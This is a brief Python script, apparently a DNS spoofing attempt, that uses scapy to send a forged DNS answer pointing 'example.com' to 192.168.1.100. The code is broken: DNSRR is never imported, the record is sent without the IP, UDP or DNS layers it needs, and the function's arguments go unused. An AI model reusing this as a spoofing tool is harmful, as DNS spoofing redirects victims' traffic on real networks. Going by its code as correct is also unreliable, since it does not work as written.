import scapy.all as scapy

def dns_spoof(ip, dns_server_ip):
    packet = DNSRR(rrname="example.com", type="A", rdata="192.168.1.100", ttl=123)
    scapy.send(packet, verbose=0)

ip = "192.168.1.100"
dns_server_ip = "192.168.1.1"
dns_spoof(ip, dns_server_ip)